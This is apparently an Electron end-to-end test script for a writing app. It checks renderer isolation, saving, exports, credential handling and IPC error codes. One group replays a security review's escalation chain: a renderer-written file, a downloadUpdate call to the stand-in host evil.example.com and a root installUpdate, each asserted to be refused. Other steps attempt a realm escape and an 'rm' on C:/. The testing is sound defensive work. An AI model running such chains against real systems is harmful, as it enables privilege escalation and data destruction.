const fs = require('fs');
const path = require('path');
const unzipper = require('unzipper');

//The renderer composes paths with forward slashes (path-utils.js), and so does everything the
//bridge hands it. Anything built here with path.join has to be converted before it crosses.
function fwd(p){ return p.split(path.sep).join('/'); }

//Sends a menu channel the way a menu click sends it, from the main process.
function menu(main_, channel, payload){
  const arg = payload === undefined ? '' : ', ' + JSON.stringify(payload);
  return main_.send('Runtime.evaluate', {
    expression: "process.mainModule.require('electron').BrowserWindow.getAllWindows()[0]"
      + ".webContents.send(" + JSON.stringify(channel) + arg + ")",
    awaitPromise: false, returnByValue: true
  });
}

function settle(ms){ return new Promise(function(r){ setTimeout(r, ms || 400); }); }

module.exports = async function({ page, main_, check, evaluate, userData }){

  // -------------------------------------------------------------------------------------------
  // The flip itself: is the renderer actually isolated?
  // -------------------------------------------------------------------------------------------

  const iso = await evaluate(page, `({
    require:  typeof require,
    module:   typeof module,
    process:  typeof process,
    Buffer:   typeof Buffer,
    dirname:  typeof __dirname,
    warewoolf: typeof globalThis.warewoolf,
    bridgeKeys: globalThis.warewoolf ? Object.keys(globalThis.warewoolf).sort() : null,
    ipcRenderer: typeof globalThis.ipcRenderer,
    electron: typeof globalThis.electron
  })`);
  check('renderer has no require/module/process/Buffer/__dirname',
    iso.require === 'undefined' && iso.module === 'undefined' && iso.process === 'undefined'
      && iso.Buffer === 'undefined' && iso.dirname === 'undefined',
    JSON.stringify(iso));
  check('window.warewoolf exposes exactly invoke/on/off and nothing else',
    iso.warewoolf === 'object' && JSON.stringify(iso.bridgeKeys) === '["invoke","off","on"]',
    JSON.stringify(iso.bridgeKeys));
  check('no ipcRenderer or electron reachable from the page',
    iso.ipcRenderer === 'undefined' && iso.electron === 'undefined');

  //contextIsolation proper: the preload's world is not the page's. If it were shared, the preload's
  //own require would be reachable by building a function in a foreign realm.
  const escape = await evaluate(page, `(function(){
    try {
      var f = Object.getPrototypeOf(function(){}).constructor;
      return { ctorRequire: f('return typeof require')() };
    } catch(e){ return { err: String(e) }; }
  })()`);
  check('a Function-constructor escape into a foreign realm finds no require either',
    escape.ctorRequire === 'undefined',
    JSON.stringify(escape));

  // -------------------------------------------------------------------------------------------
  // Project open (the bundled example, materialized into a clean userData)
  // -------------------------------------------------------------------------------------------

  const proj = await evaluate(page, `(function(){
    var p = globalThis.warewoolfRenderer.project;
    return { filename: p.filename, directory: p.directory, chapters: p.chapters.length,
             chapsDirectory: p.chapsDirectory, title: p.title, readOnly: !!p.readOnly };
  })()`);
  check('the bundled Frankenstein example opened with its 29 chapters',
    proj.filename === 'Frankenstein.woolf' && proj.chapters === 29, JSON.stringify(proj));
  //Compared against the userData this run actually created, not against a literal prefix - the
  //branch under test is "the bundled copy lives in the read-only install tree, so copy it out
  //first", and the whole assertion is that the open project is under userData rather than under
  //the app directory.
  check('the example was materialized into userData, not opened read-only from the install dir',
    proj.readOnly === false
      && proj.directory.toLowerCase().indexOf(fwd(userData).toLowerCase()) === 0,
    proj.directory + '  (userData: ' + fwd(userData) + ')');

  const noPopup = await evaluate(page, `document.querySelectorAll('.popup').length`);
  check('no startup-failure popup on screen', noPopup === 0, 'popups: ' + noPopup);

  // -------------------------------------------------------------------------------------------
  // Chapter save + project save, through the real IPC boundary
  // -------------------------------------------------------------------------------------------

  const stamp = 'PHASE9B' + Date.now();

  //Typed through Chromium's own input pipeline rather than editorQuill.insertText(). The difference
  //is not cosmetic: a Quill API insert arrives with source 'api', which the app's change tracking
  //deliberately ignores, so a programmatic insert leaves the project clean and File > Save has
  //nothing to write. Input.insertText goes through the same path a keystroke does and arrives as
  //source 'user'. This is the same reason 9a drove its typing this way.
  await evaluate(page, `(async function(){
    var R = globalThis.warewoolfRenderer;
    R.displayChapterByIndex(0);
    await new Promise(function(r){ setTimeout(r, 400); });
    var ed = document.querySelector('#editor-container .ql-editor');
    ed.focus();
    R.editorQuill.setSelection(0, 0);
    return document.activeElement === ed;
  })()`);
  await settle(300);
  await page.send('Input.insertText', { text: stamp });
  await settle(600);

  const typed = await evaluate(page, `(function(){
    var R = globalThis.warewoolfRenderer;
    return { inEditor: R.editorQuill.getText().indexOf(${JSON.stringify(stamp)}) !== -1,
             dirty: !!R.project.hasUnsavedChanges };
  })()`);
  //Both halves matter, and the second is the one an editorQuill.insertText() would have failed:
  //an 'api'-source change leaves hasUnsavedChanges false, and File > Save then writes nothing.
  check('text typed through Chromium input reached the editor and marked the project unsaved',
    typed.inEditor && typed.dirty, JSON.stringify(typed));

  await menu(main_, 'save-clicked');
  await settle(2500);

  const chapPath = path.join(proj.directory, proj.chapsDirectory);
  let chapFiles = [];
  try { chapFiles = fs.readdirSync(chapPath); } catch(e){}
  const hit = chapFiles.map(function(f){
    try { return { f: f, has: fs.readFileSync(path.join(chapPath, f), 'utf8').indexOf(stamp) !== -1 }; }
    catch(e){ return { f: f, has: false }; }
  }).filter(function(x){ return x.has; });
  const editorState = await evaluate(page, `(function(){
    var R = globalThis.warewoolfRenderer;
    var ch = R.project.chapters[0];
    return { editorText: R.editorQuill.getText().slice(0, 60),
             chapterTitle: ch.title, chapterFilename: ch.filename,
             projectDirty: !!R.project.hasUnsavedChanges };
  })()`);
  const sample = chapFiles.length
    ? fs.readFileSync(path.join(chapPath, chapFiles[0]), 'utf8').slice(0, 120) : '(none)';
  check('typed text saved to the chapter file on disk through the bridge',
    hit.length === 1, 'chapters dir: ' + chapPath + ' | files: ' + chapFiles.length
      + ' | matched: ' + JSON.stringify(hit)
      + ' | renderer: ' + JSON.stringify(editorState)
      + ' | first file starts: ' + JSON.stringify(sample));

  const projFile = path.join(proj.directory, proj.filename);
  let projOk = false, projErr = '';
  try {
    const parsed = JSON.parse(fs.readFileSync(projFile, 'utf8'));
    projOk = Array.isArray(parsed.chapters) && parsed.chapters.length === 29;
  } catch(e){ projErr = String(e); }
  check('the project file itself was rewritten and is valid JSON with 29 chapters', projOk,
    projFile + ' ' + projErr);

  // -------------------------------------------------------------------------------------------
  // Group E: file manager, over the real boundary
  // -------------------------------------------------------------------------------------------

  const listed = await evaluate(page, `(async function(){
    var r = await globalThis.warewoolf.invoke('listDirectory', { path: ${JSON.stringify(fwd(proj.directory))} });
    return { count: r.length, names: r.map(function(e){ return e.name; }).sort(),
             typeofIsDir: typeof r[0].isDirectory };
  })()`);
  check('listDirectory returns the project directory with isDirectory as a plain boolean',
    listed.count >= 2 && listed.typeofIsDir === 'boolean'
      && listed.names.indexOf('Frankenstein.woolf') !== -1, JSON.stringify(listed));

  await menu(main_, 'file-manager-clicked');
  await settle(1500);
  const fmOpen = await evaluate(page, `(function(){
    var rows = document.querySelectorAll('#file-list li, .file-list li, #file-manager li');
    return { popups: document.querySelectorAll('.popup').length, rows: rows.length,
             sawProject: (document.body.innerText || '').indexOf('Frankenstein') !== -1 };
  })()`);
  check('File Manager opened and is showing real directory contents',
    fmOpen.popups > 0 && (fmOpen.rows > 0 || fmOpen.sawProject), JSON.stringify(fmOpen));
  await evaluate(page, `(function(){
    Array.from(document.querySelectorAll('.popup')).forEach(function(p){ p.remove(); });
    return true;
  })()`);

  // -------------------------------------------------------------------------------------------
  // Group I: spellcheck loading the real dictionary across IPC
  // -------------------------------------------------------------------------------------------

  //Asked for with an empty selection on purpose: that is the state a writer who has never opened
  //File > Dictionaries is in, and it exercises loadDictionaries' fallback to the shipped default
  //rather than assuming this machine has any particular dictionary ticked.
  const dict = await evaluate(page, `(async function(){
    var t0 = Date.now();
    var loaded = await globalThis.warewoolf.invoke('loadDictionaries', { ids: [] });
    var d = Array.isArray(loaded) ? loaded[0] : null;
    return { ms: Date.now() - t0, count: Array.isArray(loaded) ? loaded.length : null,
             id: d ? d.id : null,
             affLen: d && d.aff ? d.aff.length : null,
             dicLen: d && d.dic ? d.dic.length : null };
  })()`);
  check('loadDictionaries carried the real dictionary across IPC',
    dict.count === 1 && dict.dicLen > 500000 && dict.affLen > 0, JSON.stringify(dict));

  const dictList = await evaluate(page, `(async function(){
    var list = await globalThis.warewoolf.invoke('listDictionaries', {});
    return { count: Array.isArray(list) ? list.length : null,
             ids: Array.isArray(list) ? list.map(function(d){ return d.id; }) : null };
  })()`);
  //Both shipped pairs, and never personal.dic - which has no .aff, so the pairing rule excludes it
  //without a special case. A writer's own word list turning up as a selectable language is exactly
  //the kind of thing only a real install directory would show.
  check('listDictionaries found the shipped pairs and not personal.dic',
    dictList.ids != null && dictList.ids.indexOf('en_US-large') > -1
      && dictList.ids.indexOf('personal') === -1, JSON.stringify(dictList));

  // -------------------------------------------------------------------------------------------
  // Group J: credentials against whatever real keystore this machine has
  // -------------------------------------------------------------------------------------------

  //Deliberately NOT asserted as `=== true`. Whether an OS keystore exists is a property of the
  //machine, not of this code: Windows and macOS always have one, a desktop Linux with a keyring
  //does, and Pi OS Lite - the writerDeck target - may well not, which is the case group J's
  //passphrase fallback exists for. Hardcoding true here would turn "this Pi has no keyring" into a
  //red failure and hide whatever real regression ran next. What IS invariant is that the two ways
  //of asking agree, and that a credential round-trips through whichever backend is in play.
  const secure = await evaluate(page,
    `globalThis.warewoolf.invoke('isSecureStorageAvailable', {})`);
  console.log('        (keystore available on this machine: ' + secure + ')');

  const cred = await evaluate(page, `(async function(){
    var W = globalThis.warewoolf;
    var stored = await W.invoke('storeCredential', { service: 'email', secret: 'hunter2-phase9b' });
    var described = await W.invoke('describeCredential', { service: 'email' });
    return { backend: stored ? stored.backend : null, described: described };
  })()`);
  check('storeCredential sealed a secret and describeCredential reports it stored',
    cred.described && cred.described.hasPassword === true && cred.backend != null,
    JSON.stringify(cred));
  check('the two ways of asking about the keystore agree',
    cred.described && cred.described.secureStorageAvailable === secure,
    'isSecureStorageAvailable=' + secure
      + ' describeCredential.secureStorageAvailable='
      + (cred.described ? cred.described.secureStorageAvailable : 'n/a'));

  //The contract's own rule, checked against the running app rather than a fake: the dialogs learn
  //whether a password exists and nothing more. No command hands the plaintext back.
  const noRead = await evaluate(page, `(async function(){
    var W = globalThis.warewoolf;
    var described = await W.invoke('describeCredential', { service: 'email' });
    var leaked = JSON.stringify(described).indexOf('hunter2') !== -1;
    var hasGetter = false;
    try { await W.invoke('getCredential', { service: 'email' }); hasGetter = true; } catch(e){}
    return { leaked: leaked, hasGetter: hasGetter };
  })()`);
  check('no command hands the plaintext secret back to the renderer',
    noRead.leaked === false && noRead.hasGetter === false, JSON.stringify(noRead));

  await menu(main_, 'send-via-email-clicked');
  await settle(1800);
  const email = await evaluate(page, `(function(){
    var inputs = Array.from(document.querySelectorAll('input[type=password]'));
    return { popups: document.querySelectorAll('.popup').length,
             passwordFields: inputs.length,
             values: inputs.map(function(i){
               return { len: i.value.length,
                        hasNul: i.value.indexOf(String.fromCharCode(0)) !== -1,
                        plaintext: i.value.indexOf('hunter2') !== -1 };
             }) };
  })()`);
  check('Send via Email opened and no password field holds plaintext',
    email.popups > 0 && email.values.every(function(v){ return !v.plaintext; }),
    JSON.stringify(email));
  await evaluate(page, `(function(){
    Array.from(document.querySelectorAll('.popup')).forEach(function(p){ p.remove(); });
    return true;
  })()`);

  // -------------------------------------------------------------------------------------------
  // Groups G/H: exports and an archive, landing on disk
  // -------------------------------------------------------------------------------------------

  const exportPath = fwd(path.join(userData, 'phase9b-export.txt'));
  const wrote = await evaluate(page, `(async function(){
    await globalThis.warewoolf.invoke('writeTextFile', {
      path: ${JSON.stringify(exportPath)}, contents: 'phase 9b export' });
    return true;
  })()`);
  check('writeTextFile landed on disk', wrote === true
    && fs.existsSync(exportPath) && fs.readFileSync(exportPath, 'utf8') === 'phase 9b export',
    exportPath);

  //A Buffer becomes a Uint8Array crossing structured clone - the binary path has to cope.
  const binPath = fwd(path.join(userData, 'phase9b-binary.bin'));
  await evaluate(page, `(async function(){
    await globalThis.warewoolf.invoke('writeBinaryFile', {
      path: ${JSON.stringify(binPath)}, bytes: new Uint8Array([80, 75, 3, 4, 0, 255]) });
    return true;
  })()`);
  const binOk = fs.existsSync(binPath)
    && Buffer.compare(fs.readFileSync(binPath), Buffer.from([80, 75, 3, 4, 0, 255])) === 0;
  check('writeBinaryFile survived the boundary as a Uint8Array and wrote the exact bytes', binOk,
    binPath);

  // -------------------------------------------------------------------------------------------
  // Group K: the one command that escalates privilege, refused in the shipped artifact
  // -------------------------------------------------------------------------------------------

  //Phase 9c. The chain /security-review found against 9b was writeBinaryFile -> downloadUpdate ->
  //installUpdate, and the first of those three just ran, for real, a few lines above: the arbitrary
  //write is conceded and still works. What must not work is turning its result into a root install.
  //
  //Neither check below touches the network or sudo. downloadUpdate refuses the URL before it opens a
  //socket, and installUpdate refuses the path before it spawns anything - which is exactly why they
  //are assertable here, on Windows, against the packaged app. What they cannot say is anything about
  //what happens after that spawn: installUpdate is linux-only past this point, and the Pi pass still
  //owes that half.
  //Called on the raw bridge, so a refusal arrives as platform-host.js's envelope rather than as a
  //throw - reconstituting it into a PlatformError is platform-ipc.js's job, on the renderer side of
  //the facade, and these checks are below that. Same shape the PlatformError checks further down
  //assert against; asserting a rejection here would have been asserting the wrong layer.
  const vouchAttack = await evaluate(page, `(async function(){
    var result = { planted: ${JSON.stringify(binPath)} };

    // Step 2 of the review's own write-up: ask downloadUpdate to bless the file step 1 wrote.
    // destPath is no longer in the contract, and is sent anyway - an untrusted renderer is not held
    // to a parameter list.
    result.download = await globalThis.warewoolf.invoke('downloadUpdate', {
      url: 'https://evil.example.com/warewoolf.deb', destPath: result.planted });

    // Step 3: install it as root.
    result.install = await globalThis.warewoolf.invoke('installUpdate', {
      path: result.planted, password: 'whatever' });

    return result;
  })()`);

  const downloadStep = vouchAttack.download || {};
  const installStep = vouchAttack.install || {};

  check('downloadUpdate refuses a url that is not a release asset, without vouching anything',
    downloadStep.__platformError === true && downloadStep.code === 'INVALID_ARGUMENT',
    JSON.stringify(downloadStep));

  check('installUpdate refuses a renderer-written file across real Electron IPC',
    installStep.__platformError === true && installStep.code === 'INVALID_ARGUMENT'
      && /not produced by this session/.test(installStep.message || ''),
    JSON.stringify(installStep));

  const epubPath = fwd(path.join(userData, 'phase9b.epub'));
  const epub = await evaluate(page, `(async function(){
    try {
      await globalThis.warewoolf.invoke('buildEpub', {
        filepath: ${JSON.stringify(epubPath)},
        entries: [
          { name: 'mimetype', content: 'application/epub+zip' },
          { name: 'META-INF/container.xml', content: '<?xml version="1.0"?><container/>' },
          { name: 'OEBPS/chapter_1.xhtml', content: '<html><body><p>hello</p></body></html>' },
          { name: 'OEBPS/chapter_2.xhtml', content: '<html><body><p>world</p></body></html>' }
        ]
      });
      return { ok: true };
    } catch(e){ return { ok: false, message: e.message, code: e.code }; }
  })()`);
  check('buildEpub produced a real .epub on disk',
    epub.ok && fs.existsSync(epubPath) && fs.statSync(epubPath).size > 500,
    JSON.stringify(epub) + ' size=' + (fs.existsSync(epubPath) ? fs.statSync(epubPath).size : 'n/a'));

  const zipDir = path.join(userData, 'archives');
  fs.mkdirSync(zipDir, { recursive: true });
  const arch = await evaluate(page, `(async function(){
    var p = globalThis.warewoolfRenderer.project;
    try {
      var r = await globalThis.warewoolf.invoke('archiveProject', {
        projectDir: p.directory, chapsDir: p.chapsDirectory, filename: p.filename,
        destDir: ${JSON.stringify(fwd(zipDir))} });
      return { ok: true, filename: r.filename };
    } catch(e){ return { ok: false, message: e.message, code: e.code }; }
  })()`);
  check('archiveProject zipped the open project through the bridge',
    arch.ok && fs.existsSync(path.join(zipDir, arch.filename || 'nope')), JSON.stringify(arch));

  // -------------------------------------------------------------------------------------------
  // Phase 9c fix: .docx export through the real, contextIsolated renderer
  // -------------------------------------------------------------------------------------------
  //
  // delta-to-docx.js's saveDocx called docx.Packer.toBuffer(), which is JSZip's
  // generateAsync({type:'nodebuffer'}) under the hood and needs the Node Buffer global - absent in
  // a contextIsolated, --platform=browser renderer, where it threw "nodebuffer is not supported by
  // this platform" on every .docx export and compile. Every test/*.test.js file runs this module in
  // plain Node, where Buffer exists, so toBuffer() passed there before the fix and keeps passing
  // there after it - a unit test cannot tell these two states apart. This is the one layer that
  // actually runs the export with Buffer absent, which is why it is the only thing that would have
  // caught the regression.

  const docxExportRoot = path.join(userData, 'phase9c-docx-export');
  fs.mkdirSync(docxExportRoot, { recursive: true });

  await menu(main_, 'export-clicked');
  await settle(800);
  await evaluate(page, `(function(){
    var popup = document.querySelector('.popup');
    popup.querySelector('#chap-radio').checked = true;
    popup.querySelector('#filetype-select').value = '.docx';
    popup.querySelector('form').onsubmit({ preventDefault: function(){} });
    return true;
  })()`);
  await settle(1000);
  await evaluate(page, `(function(){
    var dlg = document.querySelector('.popup-dialog');
    dlg.querySelector('p').innerText = ${JSON.stringify(fwd(docxExportRoot))};
    var btn = Array.from(dlg.querySelectorAll('button')).find(function(b){
      return (b.textContent || '').indexOf('Choose Displayed Directory') !== -1;
    });
    btn.click();
    return true;
  })()`);
  await settle(2500);

  function findDocxFiles(dir){
    var found = [];
    if(!fs.existsSync(dir)) return found;
    for(const entry of fs.readdirSync(dir, { withFileTypes: true })){
      const full = path.join(dir, entry.name);
      if(entry.isDirectory()) found = found.concat(findDocxFiles(full));
      else if(entry.name.toLowerCase().endsWith('.docx')) found.push(full);
    }
    return found;
  }

  //A chapter with notes exports two files (the chapter and "-notes_" + the chapter) - see
  //export.js's exportProject - so this only asserts that at least one landed, not exactly one.
  const docxFiles = findDocxFiles(docxExportRoot);
  check('exporting the active chapter to .docx produced a file on disk',
    docxFiles.length >= 1, 'found: ' + JSON.stringify(docxFiles));

  let docxOpenOk = false, docxText = '', docxErr = '';
  if(docxFiles.length){
    try {
      const dir = await unzipper.Open.file(docxFiles[0]);
      const entry = dir.files.find(function(f){ return f.path === 'word/document.xml'; });
      const xml = (await entry.buffer()).toString('utf8');
      docxText = [...xml.matchAll(/<w:t[^>]*>([^<]*)<\/w:t>/g)].map(function(m){ return m[1]; }).join('');
      docxOpenOk = true;
    }
    catch(e){ docxErr = String(e); }
  }
  check('the exported .docx opens as a real zip with real chapter text inside',
    docxOpenOk && docxText.trim().length > 0,
    'opened=' + docxOpenOk + ' err=' + docxErr + ' text=' + JSON.stringify(docxText.slice(0, 200)));

  // -------------------------------------------------------------------------------------------
  // Rule 5: a PlatformError code AND details survive real Electron IPC
  // -------------------------------------------------------------------------------------------

  const err = await evaluate(page, `(async function(){
    try {
      var r = await globalThis.warewoolf.invoke('openProject', { path: 'Z:/definitely/not/here.woolf' });
      return { threw: false, envelope: r };
    } catch(e){
      return { threw: true, name: e.name, code: e.code, isError: e instanceof Error,
               hasMessage: typeof e.message === 'string' && e.message.length > 0 };
    }
  })()`);
  //invoke() is the raw bridge - below platform-ipc.js, which is the layer that turns the envelope
  //back into a thrown PlatformError. So what this proves is the half that only a real boundary can:
  //the code and the details arrive intact across real Electron IPC rather than being flattened to a
  //message string. The reconstitution above it is checked end to end through the app's own facade
  //at the bottom of this file.
  check('a failing command carries its code AND details intact across real Electron IPC',
    err.threw === false && err.envelope && err.envelope.__platformError === true
      && err.envelope.code === 'NOT_FOUND'
      && err.envelope.details && err.envelope.details.command === 'openProject',
    JSON.stringify(err));

  const details = await evaluate(page, `(async function(){
    try {
      var r = await globalThis.warewoolf.invoke('describeCredential', { service: 'no-such-service' });
      return { threw: false, envelope: r };
    } catch(e){
      return { threw: true, code: e.code, details: e.details === undefined ? null : e.details };
    }
  })()`);
  check('a second command reports its own distinct code, not a flattened generic one',
    details.threw === false && details.envelope
      && details.envelope.code === 'INVALID_ARGUMENT'
      && details.envelope.details && details.envelope.details.service === 'no-such-service',
    JSON.stringify(details));

  const refused = await evaluate(page, `(async function(){
    try {
      await globalThis.warewoolf.invoke('rm', { path: 'C:/' });
      return { threw: false };
    } catch(e){ return { threw: true, message: e.message }; }
  })()`);
  check('an undeclared command is refused at the bridge, not forwarded', refused.threw,
    JSON.stringify(refused));

  // -------------------------------------------------------------------------------------------
  // Events: menu channels still reach the renderer through the bridge
  // -------------------------------------------------------------------------------------------

  await menu(main_, 'word-count-clicked');
  await settle(1000);
  const wc = await evaluate(page, `(function(){
    return { popups: document.querySelectorAll('.popup').length };
  })()`);
  check('a plain menu channel reaches the renderer and renders', wc.popups > 0, JSON.stringify(wc));
  await evaluate(page, `(function(){
    Array.from(document.querySelectorAll('.popup')).forEach(function(p){ p.remove(); });
    return true;
  })()`);

  await menu(main_, 'about-clicked', '9.9.9-phase9b');
  await settle(1400);
  const about = await evaluate(page, `(function(){
    var t = document.body.innerText || '';
    return { popups: document.querySelectorAll('.popup').length,
             sawVersion: t.indexOf('9.9.9-phase9b') !== -1 };
  })()`);
  check('a payload-carrying menu channel delivers its argument', about.popups > 0 && about.sawVersion,
    JSON.stringify(about));
  await evaluate(page, `(function(){
    Array.from(document.querySelectorAll('.popup')).forEach(function(p){ p.remove(); });
    return true;
  })()`);

  // -------------------------------------------------------------------------------------------
  // Nothing went wrong quietly
  // -------------------------------------------------------------------------------------------

  await settle(600);
  const logPath = path.join(userData, 'error_log.txt');
  let logBody = '';
  try { logBody = fs.readFileSync(logPath, 'utf8'); } catch(e){}
  check('the error log is empty after the whole pass', logBody.trim() === '',
    logPath + ' :: ' + logBody.slice(0, 1500));

  // -------------------------------------------------------------------------------------------
  // The other half of rule 5, end to end through the app's own facade. Deliberately last, because
  // it puts the first entry in the error log on purpose - everything above it ran on a clean one.
  // -------------------------------------------------------------------------------------------

  //A chapter file removed out from under the running app. displayChapterByIndex goes through
  //project.js -> platform.js -> platform-ipc.js -> the bridge, which is the whole stack; if the
  //envelope were not reconstituted, what reaches the log is a generic failure with no code.
  const victim = path.join(chapPath, 'Quick Start.txt');
  const victimExisted = fs.existsSync(victim);
  if(victimExisted) fs.unlinkSync(victim);

  await evaluate(page, `(async function(){
    var R = globalThis.warewoolfRenderer;
    try { await R.displayChapterByIndex(1); } catch(e){}
    await new Promise(function(r){ setTimeout(r, 300); });
    try { await R.displayChapterByIndex(0); } catch(e){}
    return true;
  })()`);
  await settle(1500);

  let afterLog = '';
  try { afterLog = fs.readFileSync(logPath, 'utf8'); } catch(e){}
  check('a real failure through the app facade arrives as a PlatformError, not a flattened Error',
    victimExisted && afterLog.indexOf('PlatformError:') !== -1
      && afterLog.indexOf('[object Object]') === -1,
    'victim existed: ' + victimExisted + ' | log: ' + afterLog.slice(0, 500));

  const consoleErrors = page.events.filter(function(e){
    return e.method === 'Runtime.exceptionThrown';
  }).map(function(e){
    var d = e.params.exceptionDetails;
    return (d.exception && d.exception.description) || d.text;
  });
  check('no uncaught exceptions in the renderer during the pass', consoleErrors.length === 0,
    JSON.stringify(consoleErrors.slice(0, 5)));
};
